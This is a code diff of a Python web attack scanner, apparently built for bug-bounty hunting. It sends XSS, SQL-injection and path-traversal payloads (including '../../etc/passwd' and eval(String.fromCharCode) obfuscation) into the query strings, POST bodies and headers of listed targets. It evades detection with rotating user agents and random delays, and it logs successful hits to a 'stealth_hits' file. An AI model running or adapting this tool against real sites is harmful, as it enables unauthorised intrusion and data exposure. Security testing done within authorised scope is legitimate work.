@@ -1,8 +1,56 @@
-# foxstrike_mutation_ai.py
+
 import requests, random, time, os, signal, sys, base64
+from shadow_payload_lab import obfuscate_payload, generate_mutated_payload
+import json
+
+with open("rainbow_vectors/inputs_map.json", "r") as f:
+    INPUT_MAP = json.load(f)
+
+
+def send_payload(method, url, content_type=None, data=None):
+    headers = {}
+    if content_type and content_type != "headers":
+        headers["Content-Type"] = content_type
+
+    if content_type == "headers":
+        headers.update(data)
+        return requests.get(url, headers=headers)
+    elif method == "GET":
+        return requests.get(url, headers=headers)
+    elif method == "POST":
+        if content_type == "application/json":
+            return requests.post(url, json=json.loads(data), headers=headers)
+        else:
+            return requests.post(url, data=data, headers=headers)
+def generate_requests_for_target(url, payload):
+    requests = []
+
+    config = INPUT_MAP.get(url)
+    if not config:
+        return requests
+
+    # GET
+    for query in config.get("GET", []):
+        full_url = url + query.replace("<<PAYLOAD>>", payload)
+        requests.append(("GET", full_url, None, None))
+
+    # POST
+    for content_type, bodies in config.get("POST", {}).items():
+        for body in bodies:
+            replaced_body = body.replace("<<PAYLOAD>>", payload)
+            requests.append(("POST", url, content_type, replaced_body))
+
+    # HEADERS
+    for header_dict in config.get("HEADERS", []):
+        h = {}
+        for k, v in header_dict.items():
+            h[k] = v.replace("<<PAYLOAD>>", payload)
+        requests.append(("GET", url, "headers", h))
+
+    return requests
 
 def sigint_handler(sig, frame):
-    print("\n[!] Prekid detektovan – zatvaram lisicu.")
+    print("\n[!] Prekid detektovan – zatvaram Lisicu.")
     sys.exit(0)
 signal.signal(signal.SIGINT, sigint_handler)
 
@@ -11,37 +59,40 @@ def prepare_headers():
     return {
         "User-Agent": random.choice([
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-            "Mozilla/5.0 (X11; Linux x86_64)",
-            "Mozilla/5.0 (Android 11; Mobile)"
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
+            "Mozilla/5.0 (Linux; Android 11; SM-G991B)"
         ]),
-        "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Language": random.choice(["en-US", "en", "sr-RS"]),
         "X-HackerOne-Research": "Whitefox980H1_Base64: V2hpdGVmb3g5ODBIMQ==",
         "X-Requested-With": "XMLHttpRequest"
     }
 
 # ADAPTIVNA MUTACIJA
-def adaptive_mutate(payload):
+
+import json
+
+def adaptively_mutate(payload):
     base = [
         f"<template>{payload}</template>",
-        f"<noscript>{payload}</noscript>",
         f"<form><input name='note' value='{payload}'></form>",
-        f"{{\"action\": \"test\", \"data\": {{\"token\": \"{payload}\"}}}}",
-        f"eval(String.fromCharCode({','.join([str(ord(c)) for c in payload])}))"
+        f'<noscript><template>{payload}</template></noscript>',
+        f'{{"action": "test", "data": {{"token": "{payload}"}}}}',
+        f"eval(String.fromCharCode({','.join(str(ord(c)) for c in payload)}))"
     ]
     return random.choice(base)
-
 # PAYLOADI OSNOVA
 base_payloads = [
     "<script>alert(1)</script>",
     "<img src=x onerror=alert('xss')>",
     "' OR '1'='1",
-    "../../../etc/passwd"
+    "../../etc/passwd"
 ]
 
-def detect_type(p):  # brza klasifikacija
+# Brza klasifikacija
+def detect_type(p):
     if "script" in p or "onerror" in p: return "XSS"
-    elif "OR '1" in p: return "SQLi"
-    elif "../" in p or "passwd" in p: return "LFI"
+    elif "OR '1'" in p: return "SQLi"
+    elif ".." in p or "passwd" in p: return "LFI"
     return "Other"
 
 # CSP?
@@ -52,30 +103,31 @@ def has_csp(target):
     except:
         return False
 
+# CORE
 def run_mutation_mode(target):
-    print(f"\n[ShadowFox10.3 :: AI-MUTATOR] {target}")
-    mutated_payloads = [adaptive_mutate(p) for p in base_payloads]
+    print(f"\n[ShadowFOX10.3 :: AI-MUTATOR] {target}")
+    payloads = [generate_mutated_payload(detect_type(p)) for p in base_payloads]
 
-    for p in mutated_payloads:
-        if os.path.exists("STOP_FOX"):
-            print("[!] STOP_FOX signal – zaustavljam.")
-            sys.exit(0)
+    config = INPUT_MAP.get(target)
+    if not config:
+        print(f"[!] Nema definisanih inputa za {target}")
+        return
 
-        full_url = f"{target}?q={p}"
-        try:
-            r = requests.get(full_url, headers=prepare_headers(), timeout=8)
-            status = r.status_code
-            ptype = detect_type(p)
-            print(f"[{status} :: {ptype}] {full_url}")
+    for payload in payloads:
+        reqs = generate_requests_for_target(target, payload)
+        for method, url, content_type, data in reqs:
+            try:
+                response = send_payload(method, url, content_type, data)
+                status = response.status_code
+                ptype = detect_type(payload)
+                print(f"[{status} :: {ptype}] {url}")
 
-            if str(status).startswith("2"):
-                with open("reports/stealth_hits.txt", "a") as f:
-                    f.write(f"[{status} :: {ptype}] {full_url}\n")
-
-            time.sleep(random.randint(3, 6))
-        except Exception as e:
-            print(f"[ERROR] {full_url} → {str(e)}")
-
+                if str(status).startswith("2"):
+                    with open("reports/stealth_hits.txt", "a") as f:
+                        f.write(f"[{status} :: {ptype}] {url}\n")
+                time.sleep(random.randint(3, 6))
+            except Exception as e:
+                print(f"[ERROR] {url} :: {str(e)}")
 if __name__ == "__main__":
     try:
         with open("targets.txt") as f:
@@ -84,11 +136,4 @@ if __name__ == "__main__":
             run_mutation_mode(t)
     except KeyboardInterrupt:
         print("\n[!] Prekid – AI agent se povlači.")
-import hashlib
 
-def hash_payload(payload):
-    return hashlib.md5(payload.encode()).hexdigest()[:8]
-
-payload = "<script>alert(1)</script>"
-payload_id = hash_payload(payload)
-url = f"https://target.com?q={payload}#ID-{payload_id}"
